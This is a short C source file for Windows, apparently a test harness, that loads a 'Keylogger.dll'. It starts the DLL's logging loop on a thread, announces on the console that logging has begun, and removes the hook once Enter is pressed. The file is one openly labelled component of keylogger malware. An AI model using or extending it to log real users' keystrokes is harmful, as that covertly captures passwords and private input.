// Base program to load Keylogger DLL
// After setting hook, waits for user to press enter before unloading the hook to give time to log keys

#include <Windows.h>
#include <strsafe.h>

typedef VOID(*LPHOOKFUNC)();

INT main()
{
	HMODULE hKeyloggerDll = NULL;
	hKeyloggerDll = LoadLibraryW(L"Keylogger.dll");
	if (NULL == hKeyloggerDll)
	{
		// DLL not found
		return -1;
	}

	LPHOOKFUNC lpSetHook = (LPHOOKFUNC)GetProcAddress(hKeyloggerDll, "SetHook");
	LPHOOKFUNC lpRemoveHook = (LPHOOKFUNC)GetProcAddress(hKeyloggerDll, "RemoveHook");
	LPHOOKFUNC lpInitLoop = (LPHOOKFUNC)GetProcAddress(hKeyloggerDll, "InitLoop");

	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpInitLoop, NULL, 0, NULL);

	HANDLE hConsoleOut = INVALID_HANDLE_VALUE;
	hConsoleOut = GetStdHandle(STD_OUTPUT_HANDLE);
	HANDLE hConsoleIn = INVALID_HANDLE_VALUE;
	hConsoleIn = GetStdHandle(STD_INPUT_HANDLE);

	WriteConsoleA(hConsoleOut, "DLL should be loaded. Logging started.\n", 39, NULL, NULL);
	WriteConsoleA(hConsoleOut, "Press enter when finished\n", 26, NULL, NULL);

	CHAR cBuff[100];
	SecureZeroMemory(cBuff, 100);
	DWORD read = 0;
	ReadConsoleA(hConsoleIn, cBuff, 1, &read, NULL);

	lpRemoveHook();

	FreeLibrary(hKeyloggerDll);

	return 0;
}